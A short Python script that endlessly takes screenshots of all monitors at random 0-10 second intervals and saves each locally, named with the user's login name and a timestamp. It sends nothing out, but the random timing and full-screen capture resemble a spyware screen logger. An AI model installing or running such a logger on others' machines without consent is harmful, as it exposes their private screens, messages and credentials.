from PIL import ImageGrab
import random
import time
import os

while True:
	username = os.getenv("USERNAME")
	random_time = random.randint(0, 10)
	time.sleep(random_time)
	snapshot = ImageGrab.grab(all_screens=True)
	file_name = username + "_" + str(time.time()) + ".png"
	snapshot.save(file_name)
